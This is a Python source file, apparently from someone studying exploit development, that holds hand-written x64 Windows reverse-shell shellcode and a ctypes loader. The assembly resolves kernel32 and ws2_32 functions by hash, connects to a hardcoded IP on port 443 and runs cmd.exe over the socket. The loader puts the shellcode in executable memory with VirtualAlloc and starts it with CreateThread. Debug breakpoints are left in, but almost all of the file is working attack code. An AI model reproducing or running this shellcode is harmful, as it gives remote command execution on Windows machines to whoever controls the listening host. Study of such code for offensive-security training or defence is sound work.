"""
OMER

1902_1154:
forgot to log, but its in the commit messages
- adapted by changing registers from e** to r**
- PEB layout changed, updated offsets to gs0x60, 0x18 & 0x30

typedef struct _UNICODE_STRING {
  USHORT Length;       // +0x0
  USHORT MaximumLength;// +0x2
  PWSTR  Buffer;       // +0x8 (on x64 systems)
} UNICODE_STRING;


2320_1247:
deleted my template, didnt work, too many changes
copied code from offsec
a few changes were needed, added in the comments



"""

import ctypes
import platform

# Generic Imports
import socket
import struct
import sys
from struct import pack

from colorama import Back, Fore, Style
from modules.ipAndPort_module import hexIP, hexPort

# Custom modules
# from modules.keystone_module import keystone_asm
from modules.msfvenom_module import generatePayload
from modules.nasm_module import nasm_asm
from modules.rorHash_module import hashFuncName

# from modules.syscallFinder_module import get_syscall_number    # cant use on <python3.8


def ret_asm() -> str:

    asm = f"""
    start:
        mov rbp, rsp 				; Set our base pointer to the current stack pointer
        sub rsp, 0x610              ; Allocate 0x610 bytes on the stack for our code's use
    
    ; ==================================================================================
    ; =================== - Locate KERNEL32 & store address in RDI - ===================
    ; ==================================================================================
	
    FIND_KERNELBASE:
        mov rcx, 60h				; RCX = 0x60
        mov r8, gs:[rcx]			; R8 = ptr to PEB ([GS:0x60])
        mov rdi, [r8 + 18h]			; RDI = PEB->Ldr
        mov rdi, [rdi + 30h]		; RDI = PEB->Ldr->InLoadInitOrder
        xor rcx, rcx 				; RCX = 0
        mov dl, 4bh					; DL = "K"

	NEXT_MODULE:				
        mov rax, [rdi+10h]			; RAX = InInitOrder[X].base_address
        mov rsi, [rdi+40h]			; RSI = InInitOrder[X].module_name
        mov rdi, [rdi]				; RDI = InInitOrder[X].flink (next)
        cmp [rsi+12*2], cx 			; (unicode) modulename[12] == 0x00 ?
        jne NEXT_MODULE 			; No: try next module
        cmp [rsi], dl 				; modulename starts with "K"
        jne NEXT_MODULE 			; No: try next module
        jmp LOCATE_FUNCS 			; Skip to main shellcode

    ; ==================================================================================
    ; ============ - Function to go through EDT & return function address - ============
    ; ==================================================================================

	LOOKUP_FUNC: 
        mov ebx, [rdi + 3ch]		; Offset to PE Signature VMA
        add rbx, 88h 				; Export table relative offset 
        add rbx, rdi 				; Export table VMA
        mov eax, [rbx] 				; Export directory relative offset
        mov rbx, rdi 				
        add rbx, rax 				; Export directory VMA
        mov eax, [rbx + 20h] 		; AddressOfNames relative offset
        mov r8, rdi 				
        add r8, rax 				; AddressOfNAmes VMA
        mov ecx, [rbx + 18h] 		; NumberOfNames

	CHECK_NAMES:
        jecxz FOUND_FUNC                ; Jump to the end if ecx is 0
        dec   ecx                       ; Decrement our names counter
        mov   eax, [r8 + rcx * 4]       ; Store the relative offset of the name
        mov   rsi, rdi                  ; 
        add   rsi, rax                  ; Set RSI to the VMA of the current name
        xor r9, r9 					; R9 = 0
        xor rax, rax 				; RAX = 0
        cld 						; Clear direction

	CALC_HASH: 	
        lodsb 						; Load the next byte from RSI into AL
        test al, al 				; Test ourselves
        jz CALC_FINISHED 			; If the ZF is set,we've hit the null term
        ror r9d, 0dh 				; Rotate R9D 13 bits to the right
        add r9, rax 				; Add the new byte to the accumulator
        jmp CALC_HASH 				; Next iteration

	CALC_FINISHED: 				 
        cmp r9d, edx 				; Compare the computed hash with the requested hash
        jnz CHECK_NAMES 			; No match, try the next one

	FIND_ADDR: 				
        mov r8d, [rbx + 24h] 		; Ordinals table relative offset
        add r8, rdi 				; Ordinals table VMA
        xor rax, rax 				; RAX = 0
        mov ax, [r8 + rcx * 2] 		; Extrapolate the function's ordinal
        mov r8d, [rbx + 1ch] 		; Address table relative offset
        add r8, rdi 				; Address table VMA
        mov eax, [r8 + rax * 4] 	; Extract the relative function offset from its ordinal
        add rax, rdi 				; Function VMA

	FOUND_FUNC: 				
        ret 					

	LOCATE_FUNCS: 				
        mov rdi, rax 				; Store moduleBase
        sub rsp, 8
        mov r15, rsp 				; Stack pointer for storage

	LOCATE_LOADLIBRARYA:
        mov edx, {hashFuncName("LoadLibraryA")}	; Hash of "LoadLibraryA"
        call LOOKUP_FUNC
        mov [r15+80h], rax

    LOCATE_CREATEPROCESSA:
        mov edx, {hashFuncName("CreateProcessA")}
        call LOOKUP_FUNC 			
        int3
        mov [r15+88h], rax 	

    LOCATE_TERMINATEPROCESS:
        mov edx, {hashFuncName("TerminateProcess")}
        call LOOKUP_FUNC
        mov [r15+90h], rax

    ; ==================================================================================
    ; ==================== - Locate WS2_32 & store address in RDI - ====================
    ; ==================================================================================
	
        
	CALL_LOADLIBRARYA:
        mov rcx, 642e32335f327377h      ; "ws2_32.d" in hex(reversed)
        mov [r15+100h], rcx
        mov rcx, 6c6ch                  ; "ll" in hex(reversed)
        mov [r15+108h], rcx
        lea rcx, [r15+100h]
        mov rax, [r15+80h]
        call rax
        mov rdi, rax

	LOCATE_WSASTARTUP:
        mov edx, {hashFuncName("WSAStartup")}
        call LOOKUP_FUNC
        mov [r15+98h], rax

	LOCATE_WSASOCKETA:
        mov edx, {hashFuncName("WSASocketA")}		
        call LOOKUP_FUNC
        mov [r15+0a0h], rax

	LOCATE_CONNECT:
        mov edx, {hashFuncName("connect")}
        call LOOKUP_FUNC
        mov [r15+0a8h], rax
    

	CALL_WSASTARTUP:
        mov rcx, 202h
        lea rdx, [r15+200h]
        mov rax, [r15+98h]
        call rax

	CALL_WSASOCKETA:
        mov ecx, 2
        mov edx, 1
        mov r8, 6
        xor r9, r9
        mov [rsp+20h], r9
        mov [rsp+28h], r9
        mov rax, [r15+0a0h]
        call rax
        mov rsi, rax

	CALL_CONNECT:
        mov rcx, rax
        mov r8, 10h
        lea rdx, [r15+220h]
        mov r9, 0x{hexIP("192.168.182.135")[2:]}{hexPort(443)[2:]}0002 ; fix with correct IP
        mov [rdx], r9
        xor r9, r9
        mov [rdx+8], r9
        mov rax, [r15+0a8h]
        call rax


    ; ==================================================================================
    ; ======================= - Setup Args for CreateProcessA - ========================
    ; ==================================================================================
    
    
	SETUP_SI_AND_PI:
        mov rdi, r15                ; lpProcessInformation and lpStartupInfo 
        add rdi, 300h               ;
        mov rbx, rdi                ;
        xor eax, eax                ;
        mov ecx, 20h                ;
        rep stosd                   ; Zero 0x80 bytes
        mov eax, 68h                ; lpStartupInfo.cb = sizeof(lpStartupInfo)
        mov [rbx], eax              ;
        mov eax, 100h				; STARTF_USESTDHANDLES
        mov [rbx+3ch], eax 			; lpStartupInfo.dwFlags
        mov [rbx+50h], rsi 			; lpStartupInfo.hStdInput = socket handle
        mov [rbx+58h], rsi 			; lpStartupInfo.hStdOutput = socket handle
        mov [rbx+60h], rsi 			; lpStartupInfo.hStdError = socket handle
    
    CALL_CREATEPROCESSA:
        xor ecx, ecx                ; lpApplicationName
        mov rdx, r15                ; lpCommandLine
        add rdx, 180h               ;
        mov eax, 646d63h 			      ; "cmd"
        mov [rdx], rax 
        xor r8, r8                  ; lpProcessAttributes
        xor r9, r9                  ; lpThreadAttributes
        xor eax, eax                ;
        inc eax 
        mov [rsp + 20h], rax        ; bInheritHandles
        dec eax
        mov [rsp + 28h], rax        ; dwCreationFlags
        mov [rsp + 30h], rax        ; lpEnvironment
        mov [rsp + 38h], rax        ; lpCurrentDirectory
        mov [rsp + 40h], rbx        ; lpStartupInfo
        add rbx, 68h                ;
        mov [rsp + 48h], rbx        ; lpProcessInformation
        mov rax, [r15+88h]
        int3
        call rax

    CALL_TERMINATEPROCESS:
        mov edx, {hashFuncName("TerminateProcess")}
        call LOOKUP_FUNC
        xor rcx, rcx
        dec rcx 					; Process handle
        xor rdx, rdx 				; Zero RDX == Exit Reason
        mov rax, [r15+90h]
        call rax					; TerminateProcess
    """

    return asm


# Keystone
def get_shellcode():
    asm = ret_asm()

    shellcode = b""
    # shellcode += keystone_asm(CODE=asm, debug=True)
    shellcode += nasm_asm(
        CODE=asm,
        arch=64,
        print=True,
        inject_fixes=True,
        # hex_split="db",
        build_exe=False,
    )

    # keystone_asm returns bytes, so we can return it as a bytesarray
    shellcode = bytearray(shellcode)
    return shellcode


def stuff_ctypes():
    # idk where to put this but ik this comes after shellcode
    shellcode = get_shellcode()

    # load addr of kernel32.dll
    kernel32 = ctypes.windll.kernel32
    if kernel32:
        # print the ptr obj
        print(f"{Fore.LIGHTBLUE_EX}\t o Found {kernel32}{Style.RESET_ALL}")

    # ==================== allocate buffer ====================
    # setup VirtAlloc args
    # arg1: LPVOID lpAddress -> 0x0 because we want the OS to decide
    # arg2: SIZE_T dwSize -> size of shellcode
    # arg3: DWORD flAllocationType -> Default: 0x3000 = MEM_COMMIT(0x1000) | MEM_RESERVE(0x2000)
    # arg4: DWORD flProtect -> Default: 0x40 = PAGE_EXECUTE_READWRITE

    # Ensure correct types for args to VirtualAlloc
    kernel32.VirtualAlloc.argtypes = [
        ctypes.c_void_p,
        ctypes.c_size_t,
        ctypes.c_uint32,
        ctypes.c_uint32,
    ]

    # Ensure correct return type for VirtualAlloc
    kernel32.VirtualAlloc.restype = ctypes.c_void_p

    # call VirtAlloc
    ptr = kernel32.VirtualAlloc(0x0, len(shellcode), 0x3000, 0x40)
    if ptr == 0:
        raise Exception("VirtualAlloc failed")
    else:
        print(
            f"{Fore.LIGHTBLUE_EX}\t o Allocated memory at address: {hex(ptr)}{Style.RESET_ALL}"
        )

    # ==================== copy buffer ====================
    # since shellcode var from get_shellcode() is 'bytes' (read-only),
    # use a copy-backed ctypes buffer
    buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
    if not buf:
        raise Exception("Buffer creation failed")
    else:
        # print buffer obj
        print(f"{Fore.LIGHTBLUE_EX}\t o Created buffer object:{Style.RESET_ALL}")
        print(f"{Fore.LIGHTBLUE_EX}\t\t{buf}{Style.RESET_ALL}")

    # ensure correct types for RtlMoveMemory
    kernel32.RtlMoveMemory.argtypes = [
        ctypes.c_void_p,
        ctypes.c_void_p,
        ctypes.c_size_t,
    ]
    # ensure correct return type for RtlMoveMemory
    kernel32.RtlMoveMemory.restype = None

    # copy shellcode into allocated memory
    kernel32.RtlMoveMemory(ptr, buf, len(shellcode))

    # Get current PID
    current_pid = kernel32.GetCurrentProcessId()

    input(
        f"{Fore.LIGHTYELLOW_EX}\n\n\t o Please Attach debugger to python.exe({current_pid}), press enter to continue...\n\n{Style.RESET_ALL}"
    )

    # ==================== create thread ====================
    # setup CreateThread args
    # arg1: LPSECURITY_ATTRIBUTES lpThreadAttributes -> NULL
    # arg2: SIZE_T dwStackSize -> 0 (default)
    # arg3: LPTHREAD_START_ROUTINE lpStartAddress -> ptr to shellcode
    # arg4: LPVOID lpParameter -> NULL
    # arg5: DWORD dwCreationFlags -> 0 (run immrdiately)
    # arg6: LPDWORD lpThreadId -> NULL

    # Ensure correct types for args to CreateThread
    kernel32.CreateThread.argtypes = [
        ctypes.c_void_p,
        ctypes.c_size_t,
        ctypes.c_void_p,
        ctypes.c_void_p,
        ctypes.c_uint32,
        ctypes.POINTER(ctypes.c_uint32),
    ]

    # Ensure correct return type for CreateThread
    kernel32.CreateThread.restype = ctypes.c_void_p

    # call CreateThread
    thread_id = ctypes.c_uint32(0)
    thread_handle = kernel32.CreateThread(
        None, 0, ptr, None, 0, ctypes.byref(thread_id)
    )
    if thread_handle == 0:
        raise Exception("CreateThread failed")
    else:
        print(
            f"{Fore.LIGHTBLUE_EX}\t o Created thread with ID: {thread_id.value}{Style.RESET_ALL}"
        )

    # ==================== wait for thread ====================
    # setup WaitForSingleObject args
    # arg1: HANDLE hHandle -> thread_handle
    # arg2: DWORD dwMilliseconds -> 0xFFFFFFFF (INFINITE)

    # Ensure correct types for args to WaitForSingleObject
    kernel32.WaitForSingleObject.argtypes = [ctypes.c_void_p, ctypes.c_uint32]
    # Ensure correct return type for WaitForSingleObject
    kernel32.WaitForSingleObject.restype = ctypes.c_uint32

    # call WaitForSingleObject
    result = kernel32.WaitForSingleObject(thread_handle, 0xFFFFFFFF)
    if result != 0:
        raise Exception("WaitForSingleObject failed")
    else:
        print(f"{Fore.LIGHTBLUE_EX}Thread has finished execution.{Style.RESET_ALL}")


if __name__ == "__main__":
    try:
        plat = platform.architecture()
        print(
            f"{Fore.LIGHTWHITE_EX}[+] Python Architecture: {plat[0]}{Style.RESET_ALL}"
        )
        print(f"{Fore.LIGHTWHITE_EX}[+] Platform: {plat[1]}{Style.RESET_ALL}")
        stuff = stuff_ctypes()

        print(f"{Fore.LIGHTRED_EX}[+]{Fore.LIGHTYELLOW_EX} Done!{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.LIGHTRED_EX}{e}")
    except KeyboardInterrupt:
        print(f"{Fore.LIGHTRED_EX}\n\n[!] Caught CTRL+C \nExiting...{Style.RESET_ALL}")
